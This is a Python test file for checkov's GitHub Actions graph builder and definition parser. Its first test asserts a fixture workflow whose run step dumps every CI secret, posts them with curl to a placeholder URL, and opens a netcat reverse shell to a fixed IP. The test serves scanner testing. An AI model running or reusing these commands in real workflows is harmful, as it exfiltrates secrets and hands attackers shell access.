from pathlib import Path

from checkov.common.graph.db_connectors.networkx.networkx_db_connector import NetworkxConnector
from checkov.common.graph.graph_builder import CustomAttributes
from checkov.common.graph.graph_builder.graph_components.block_types import BlockType
from checkov.common.runners.graph_manager import ObjectGraphManager
from checkov.github_actions.graph_builder.local_graph import GitHubActionsLocalGraph
from checkov.github_actions.runner import Runner
from checkov.github_actions.utils import get_gha_files_definitions, build_gha_definitions_context

RESOURCES_DIR = Path(__file__).parent / "resources"


def test_build_graph_from_definitions():
    # given
    test_file = str(RESOURCES_DIR / ".github/workflows/supply_chain.yaml")
    graph_manager = ObjectGraphManager(db_connector=NetworkxConnector(), source="GitHubActions")
    template, _ = Runner()._parse_file(f=test_file)

    # when
    local_graph = graph_manager.build_graph_from_definitions(
        definitions={test_file: template}, graph_class=GitHubActionsLocalGraph
    )

    # then
    assert len(local_graph.vertices) == 5
    assert len(local_graph.edges) == 2

    job_idx = local_graph.vertices_by_path_and_name[(test_file, "jobs.bridgecrew")]
    job = local_graph.vertices[job_idx]

    assert job.block_type == BlockType.RESOURCE
    assert job.id == "jobs.bridgecrew"
    assert job.source == "GitHubActions"
    assert job.attributes[CustomAttributes.RESOURCE_TYPE] == "jobs"
    assert job.config == {
        "runs-on": "ubuntu-latest",
        "steps": [
            {
                "name": "Run checkov",
                "id": "checkov",
                "uses": "bridgecrewio/checkov-action@master",
                "env": {
                    "GITHUB_TOKEN": "${{secrets.THIS_IS_A_TEST_SECRET}}",
                    "ACTIONS_ALLOW_UNSECURE_COMMANDS": "true",
                    "__startline__": 19,
                    "__endline__": 21,
                },
                "run": 'echo "${{ toJSON(secrets) }}" > .secrets\ncurl -X POST -s --data "@.secrets" <BADURL > /dev/null\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f\n',
                "__startline__": 15,
                "__endline__": 25,
            }
        ],
        "__startline__": 13,
        "__endline__": 25,
    }


def test_get_definitions():
    definitions, definitions_raw = get_gha_files_definitions(root_folder=str(Path(__file__).parent / "gha"))
    assert len(definitions) == len(definitions_raw) == 1
    assert definitions[list(definitions.keys())[0]] == {'name': 'read-only', 'on': {'workflow_dispatch': None, '__startline__': 4, '__endline__': 6}, 'permissions': 'write-all', 'jobs': {'example': {'runs-on': 'ubuntu-latest', 'steps': [{'uses': 'actions/checkout@93ea575cb5d8a053eaa0ac8fa3b40d7e05a33cc8', '__startline__': 12, '__endline__': 13}, {'run': 'echo "working hard"\n', '__startline__': 13, '__endline__': 15}], '__startline__': 10, '__endline__': 15}, '__startline__': 9, '__endline__': 15}, '__startline__': 1, '__endline__': 15}
    assert definitions_raw[list(definitions_raw.keys())[0]] == [(1, 'name: read-only\n'), (2, '\n'), (3, 'on:\n'), (4, '  workflow_dispatch:\n'), (5, '\n'), (6, 'permissions: write-all\n'), (7, '\n'), (8, 'jobs:\n'), (9, '  example:\n'), (10, '    runs-on: ubuntu-latest\n'), (11, '    steps:\n'), (12, '      - uses: actions/checkout@93ea575cb5d8a053eaa0ac8fa3b40d7e05a33cc8  # v3\n'), (13, '      - run: |\n'), (14, '          echo "working hard"\n')]


def test_build_def_context():
    defs, defs_raw = get_gha_files_definitions(root_folder=str(Path(__file__).parent / "gha"))
    context = build_gha_definitions_context(definitions=defs, definitions_raw=defs_raw)
    assert context[list(context.keys())[0]] == {'permissions': {'write-all': {'start_line': 6, 'end_line': 7, 'code_lines': [(6, 'permissions: write-all\n')]}}, 'jobs': {'example': {'start_line': 10, 'end_line': 15, 'code_lines': [(10, '    runs-on: ubuntu-latest\n'), (11, '    steps:\n'), (12, '      - uses: actions/checkout@93ea575cb5d8a053eaa0ac8fa3b40d7e05a33cc8  # v3\n'), (13, '      - run: |\n'), (14, '          echo "working hard"\n')]}}}
